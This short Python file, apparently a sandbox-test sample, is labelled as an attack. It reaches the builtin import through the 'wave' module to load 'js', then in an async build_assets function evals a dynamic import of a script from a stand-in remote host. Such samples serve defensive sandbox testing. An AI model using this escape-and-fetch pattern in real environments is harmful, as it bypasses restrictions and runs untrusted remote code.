"""Attack: import a JavaScript module from a remote URL."""

import wave

js = wave.builtins.__import__("js")


async def build_assets(spec, character, canvas, seed):
    await js.eval("import('https://sandbox.invalid/mod.js')")
    return {}
